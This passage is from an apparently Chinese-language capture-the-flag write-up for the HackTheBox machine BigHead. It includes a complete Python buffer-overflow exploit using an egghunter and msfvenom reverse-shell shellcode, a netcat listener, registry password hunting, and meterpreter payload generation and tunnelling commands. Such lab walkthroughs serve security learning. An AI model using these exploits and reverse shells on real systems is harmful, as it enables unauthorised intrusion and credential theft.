+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -q 41326241</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-25%20%E4%B8%8A%E5%8D%889.26.57.png" alt="截屏2021-11-25 上午9.26.57"><br>转换后发现这是36个字节，于是对其进行验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --head http://172.16.54.39:8008/$(python -c <span class="string">&#x27;print &quot;A&quot;*72 + &quot;B&quot;*8&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%888.48.35.png" alt="截屏2021-11-26 上午8.48.35"><br>这时候可以借助<code>mona</code>在开发漏洞利用（通常用于 Windows 平台）时自动化和加速特定搜索，将<code>mona.py</code>放入<code>/PyCommands</code>文件夹（在 Immunity Debugger 应用程序文件夹内）<br><em><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></strong></em></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.07.59.png" alt="截屏2021-11-26 上午9.07.59"><br>加载<code>mona</code>来检查模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.16.21.png" alt="截屏2021-11-26 上午9.16.21"><br>在查询结果中关注没有<code>ASLR</code>的情况，同时可查找jmp、esp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.20.00.png" alt="截屏2021-11-26 上午9.20.00">从中找到<code>0x625012f0</code>，这时候则要使用<code>mona</code>的<code>Egg Hunter</code>功能来寻找对应的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona egg -t 0xdf</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.37.08.png" alt="截屏2021-11-26 上午9.37.08"><br>其中可以发现存在32字节输出可用于<code>shellcode</code>，由于<code>0xdf</code>对应着<code>30786466</code>，那么<code>egghunter</code>为</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">6681caff0f42526a0258cd2e3c055a74efb8</span> <span class="string">+</span> <span class="string">egg</span> <span class="string">+</span> <span class="string">8bfaaf75eaaf75e7ffe7</span></span><br></pre></td></tr></table></figure>
+<h4 id="编写溢出脚本"><a href="#编写溢出脚本" class="headerlink" title="编写溢出脚本"></a>编写溢出脚本</h4><p>根据以上信息可以生成如下脚本用于获取反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">context(os=<span class="string">&#x27;windows&#x27;</span>, arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean_and_exit</span>(<span class="params">msg, files</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.remove(f)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">5</span>:</span><br><span class="line">    clean_and_exit(<span class="string">&quot;%s [target] [target port] [callback ip] [callback port]&quot;</span> % (sys.argv[<span class="number">0</span>]), [])</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line">cb_ip = sys.argv[<span class="number">3</span>]</span><br><span class="line">cb_port = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate Shellcode </span></span><br><span class="line">msfvenom_string = <span class="string">&#x27;msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b &quot;\\x00\\x0a\\x0d&quot; -f python -v shellcode -o sc.py&#x27;</span> % (cb_ip, cb_port)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Generating shellcode:\n    %s&quot;</span> % msfvenom_string)</span><br><span class="line">p = subprocess.Popen(msfvenom_string.split(<span class="string">&#x27; &#x27;</span>), stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = p.communicate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> err:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;[-] Unable to generate shellcode\n    %s&quot;</span> % err)</span><br><span class="line">    <span class="keyword">from</span> sc <span class="keyword">import</span> shellcode</span><br><span class="line"><span class="keyword">except</span> (NameError, Exception) <span class="keyword">as</span> e:</span><br><span class="line">    clean_and_exit(e.message, [<span class="string">&#x27;sc.py&#x27;</span>, <span class="string">&#x27;sc.pyc&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Shellcode generated successfully&quot;</span>)</span><br><span class="line">os.remove(<span class="string">&#x27;sc.py&#x27;</span>)</span><br><span class="line">os.remove(<span class="string">&#x27;sc.pyc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># !mona egg -t</span></span><br><span class="line">egg = <span class="string">&#x27;0xdf&#x27;</span></span><br><span class="line">egghunter = <span class="string">&quot;6681caff0f42526a0258cd2e3c055a74efb8&quot;</span> + egg.encode(<span class="string">&#x27;hex&#x27;</span>) + <span class="string">&quot;8bfaaf75eaaf75e7ffe7&quot;</span></span><br><span class="line"></span><br><span class="line">nops = <span class="string">&quot;\x90&quot;</span>*<span class="number">16</span></span><br><span class="line">spray = egg + egg + nops + shellcode</span><br><span class="line">post = <span class="string">&#x27;POST / HTTP/1.1\r\nHost: dev.bighead.htb\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &#123;&#125;\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(spray))</span><br><span class="line">spray_payload = post + spray</span><br><span class="line"></span><br><span class="line">head = <span class="string">&quot;HEAD /&quot;</span></span><br><span class="line">junk = <span class="string">&quot;1&quot;</span> * (<span class="number">78</span>-<span class="built_in">len</span>(head))</span><br><span class="line">jmp_esp = <span class="string">&quot;f0125062&quot;</span> <span class="comment">#p32(0x625012f0)</span></span><br><span class="line">host = <span class="string">&quot; HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n&quot;</span></span><br><span class="line">exec_payload = head + junk + jmp_esp + egghunter + host</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending payload 5 times&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    p = remote(target, port)</span><br><span class="line">    <span class="comment">#print(spray_payload)</span></span><br><span class="line">    p.sendline(spray_payload)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Payload sent.\n[*] Sleeping 1 second.&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending overflow + egghunter.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Expect callback in 0-15 minutes to %s:%s.&quot;</span> % (cb_ip, cb_port))</span><br><span class="line">p = remote(target, port)</span><br><span class="line">p.sendline(exec_payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>在以上代码中，首先生成shellcode，之后构造web请求，设置带有payload的Head，重复发送5次post请求</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>首先监听本地443端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp 443</span><br></pre></td></tr></table></figure>
+<p>接下来执行 exp 程序来获取反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exploit.py dev.bighead.htb 80 10.10.17.140 443</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8B%E5%8D%8812.13.18.png" alt="截屏2021-11-26 下午12.13.18"></p>
+<p>其中遇到一个 pwn 包的安装问题，通过以下命令即可解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 安装pip2</span></span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python get-pip.py </span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装pwntools</span></span><br><span class="line">pip2 install --upgrade setuptools</span><br><span class="line">pip2 install pwntools</span><br></pre></td></tr></table></figure>
+
+<p>等一分钟左右便可拿到shell，在当前用户桌面上寻找flag<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8B%E5%8D%8812.16.55.png" alt="截屏2021-11-26 下午12.16.55"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\Nelson\Desktop</span><br><span class="line"><span class="built_in">type</span> C:\Users\Nelson\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p>但是该 flag 并不是我们想要的<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8B%E5%8D%882.03.38.png" alt="截屏2021-11-26 下午2.03.38"></p>
+<h2 id="0x03-权限提升-nginx"><a href="#0x03-权限提升-nginx" class="headerlink" title="0x03 权限提升[nginx]"></a>0x03 权限提升[nginx]</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口进程"><a href="#端口进程" class="headerlink" title="端口进程"></a>端口进程</h4><p>查看本地开放端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%885.55.02.png" alt="截屏2021-11-27 下午5.55.02"><br>关注其中的2020端口并查找相关进程，因为在<code>nmap</code>扫描下却未发现这个端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr 1496</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%885.56.28.png" alt="截屏2021-11-27 下午5.56.28"><br>发现该进程对应的是<code>BvSshServer</code>程序</p>
+<h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><p>在注册表中搜索相关密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.12.52.png" alt="截屏2021-11-27 下午6.12.52"><br>找到一个哈希值并对其进行16进制 ASCII 转码，发现这并不是密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 336d72676e6333205361797a205472794861726465722e2e2e203b440a | xxd -p -r</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.14.38.png" alt="截屏2021-11-27 下午6.14.38"><br>继续注册表中寻找后发现一个密钥值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.16.56.png" alt="截屏2021-11-27 下午6.16.56"><br>对其进行 ASCII 解码可拿到一个字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 4800370033004200700055005900320055007100390055002D005900750067007900740035004600590055006200590030002D0055003800370074003800370000000000  | xxd -p -r</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.18.36.png" alt="截屏2021-11-27 下午6.18.36"></p>
+<h3 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h3><p>在本地连接靶机的2020端口，从而建立隧道。可以借助 plink 和 chisel 来完成</p>
+<h4 id="plink"><a href="#plink" class="headerlink" title="plink"></a>plink</h4><p>首先需要在本地开启 smb 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/python3-impacket/examples/smbserver.py . </span><br><span class="line">python3 smbserver.py mac ~/hackthebox/Machines/BigHead</span><br></pre></td></tr></table></figure>
+<p>在靶机上传输 plink.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.16.3\mac\plink.exe C:\Users\Nelson\AppData\Local\Temp\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.46.30.png" alt="截屏2021-11-27 下午6.46.30"><br>通过 plink 建立反向 ssh 隧道</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -R 2020:localhost:2020 kali@10.10.16.3</span><br></pre></td></tr></table></figure>
+<p>但是一直显示连接超时，建立失败，那么就使用 chisel 来完成隧道建立</p>
+<h4 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h4><p><em><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a></strong></em><br>首先解压该文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d chisel_1.7.6_windows_386.gz</span><br></pre></td></tr></table></figure>
+<p>将 chisel 拷贝到 temp 目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.16.3\mac\chisel_1.7.6_windows_386 C:\Users\Nelson\AppData\Local\Temp\c</span><br></pre></td></tr></table></figure>
+<p>在本地开启8888端口监听并允许反向隧道</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8888 --reverse</span><br></pre></td></tr></table></figure>
+<p>然后复制到<code>C:\Windows\System32\spool\drivers\color</code>目录下并建立连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c C:\Windows\System32\spool\drivers\color\</span><br><span class="line">c client 10.10.16.3:8888 R:2020:127.0.0.1:2020</span><br></pre></td></tr></table></figure>
+<p>但是还是出现问题，于是再次切换至msf中</p>
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p>开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter_reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.16.3</span><br><span class="line">msf &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<p>生成 exe 版本的 shell </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.16.3 LPORT=7777 -f exe &gt; m.exe</span><br><span class="line">copy \\10.10.16.3\mac\m.exe C:\Users\Nelson\AppData\Local\Temp\</span><br></pre></td></tr></table></figure>
+<p>运行后成功拿到如下会话<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.20.12.png" alt="截屏2021-11-29 上午4.20.12"><br>同时将2020端口转发到本地2020端口，至此隧道成功建立</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 2020 -p 2020 -r 127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h3><p>在本地连接 nginx 用户，密码为之前解码所得的<code>H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2020 nginx@localhost</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.36.02.png" alt="截屏2021-11-29 上午4.36.02"><br>成功登录后发现这是一个 BvShell，我们还需要通过逃逸来获得系统权限</p>
+<h2 id="0x04-权限提升-system"><a href="#0x04-权限提升-system" class="headerlink" title="0x04 权限提升[system]"></a>0x04 权限提升[system]</h2><h3 id="BvShell逃逸"><a href="#BvShell逃逸" class="headerlink" title="BvShell逃逸"></a>BvShell逃逸</h3><p>在<code>apps</code>目录下发现这个<code>testlink</code>目录，由于之前在<code>nginx.conf</code>中见到过该目录，所以在子域名中进行尝试，最终在<code>code</code>子域名下发现蹊跷，访问后会之前跳转到<code>http://127.0.0.1:5080/testlink/login.php</code>，于是将目标端口转发到本地5080</p>
